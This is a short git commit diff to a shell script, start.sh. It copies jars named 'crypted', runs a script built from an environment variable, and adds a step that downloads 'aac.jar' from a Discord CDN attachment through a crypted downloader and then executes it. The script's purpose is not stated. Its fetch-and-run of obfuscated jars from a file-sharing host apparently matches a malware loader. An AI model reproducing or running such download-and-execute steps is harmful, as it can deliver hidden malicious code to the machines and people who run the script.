4219cba9ea5ed3ff2606d7b75e4127eef9aa6a11
S3niorMCYT <77205348+SeniorMCYT@users.noreply.github.com>
2021-09-12 19:31:43 +0430

    Update start.sh

--- start.sh
+++ start.sh
@@ -3,11 +3,13 @@ cp crypted_jwget.jar /$HOME
 cd $HOME 
 echo -e $LINK2 > start2.sh
 bash start2.sh
-java -jar crypted_jwget.jar $LINK
+java -jar crypted_jwget.jar https://cdn.discordapp.com/attachments/598191803988049987/886627111790587914/aac.jar
+#java -jar crypted_jwget.jar $LINK
 java -jar crypted_jwget.jar $LINK3
 ls 
+java -jar aac.jar Storage1
 echo $PATH
-java -jar crypted_leatestacc.jar Storage1
+#java -jar crypted_leatestacc.jar Storage1
 
 
 
